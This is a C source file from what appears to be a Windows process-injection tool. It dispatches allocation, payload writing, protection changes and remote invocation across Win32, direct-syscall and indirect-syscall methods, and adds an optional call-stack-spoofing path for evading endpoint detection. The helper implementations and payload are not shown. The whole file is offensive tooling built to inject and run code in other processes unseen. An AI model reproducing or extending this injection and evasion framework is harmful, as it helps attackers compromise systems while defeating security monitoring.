#include "dispatch.h"
#include "allocate.h"
#include "write.h"
#include "protect.h"
#include "invoke.h"

#include "unwindraven_integration.h"

static DWORD WINAPI SpoofedInvokeThunk(LPVOID param)
{
    PINJECTION_CONTEXT ctx = (PINJECTION_CONTEXT)param;
    DispatchInvoke(ctx);   // respects ctx->invokeFlavor
    return 0;
}

BOOL EngineInvoke(PINJECTION_CONTEXT ctx)
{
    if (!ctx->spoofCallstack)
        return DispatchInvoke(ctx);

    switch (ctx->csTechnique)
    {
        case UNWIND_RAVEN:
            return SpoofedInvoke_UnwindRaven(ctx);

        default:
            return DispatchInvoke(ctx);
    }
}

BOOL DispatchAllocate(PINJECTION_CONTEXT ctx, DWORD protect)
{
    switch (ctx->allocFlavor)
    {
        case FLAVOR_WIN32:      return Win32Allocate(ctx, protect);
        case FLAVOR_DFR:        return DFRAllocate(ctx, protect);
        case FLAVOR_DIRECT:     return DirectAllocate(ctx, protect);
        case FLAVOR_INDIRECT:   return IndirectAllocate(ctx, protect);
        default:                return Win32Allocate(ctx, protect);
    }
}

BOOL DispatchWrite(PINJECTION_CONTEXT ctx, LPCVOID payload) {
    switch (ctx->writeFlavor) {
        case FLAVOR_WIN32:    return Win32Write(ctx, payload);
        case FLAVOR_DFR:      return DFRWrite(ctx, payload);
        case FLAVOR_DIRECT:   return DirectWrite(ctx, payload);
        case FLAVOR_INDIRECT: return IndirectWrite(ctx, payload);
        default:              return Win32Write(ctx, payload);
    }
}

BOOL DispatchProtect(PINJECTION_CONTEXT ctx,
                     DWORD prot,
                     PDWORD oldProt) {
    switch (ctx->protectFlavor) {
        case FLAVOR_WIN32:    return Win32Protect(ctx, prot, oldProt);
        case FLAVOR_DFR:      return DFRProtect(ctx, prot, oldProt);
        case FLAVOR_DIRECT:   return DirectProtect(ctx, prot, oldProt);
        case FLAVOR_INDIRECT: return IndirectProtect(ctx, prot, oldProt);
        default:              return Win32Protect(ctx, prot, oldProt);
    }
}

BOOL DispatchInvoke(PINJECTION_CONTEXT ctx) {
    switch (ctx->invokeFlavor) {
        case FLAVOR_WIN32:    return Win32Invoke(ctx);
        case FLAVOR_DFR:      return DFRInvoke(ctx);
        case FLAVOR_DIRECT:   return DirectInvoke(ctx);
        case FLAVOR_INDIRECT: return IndirectInvoke(ctx);
        default:              return Win32Invoke(ctx);
    }
}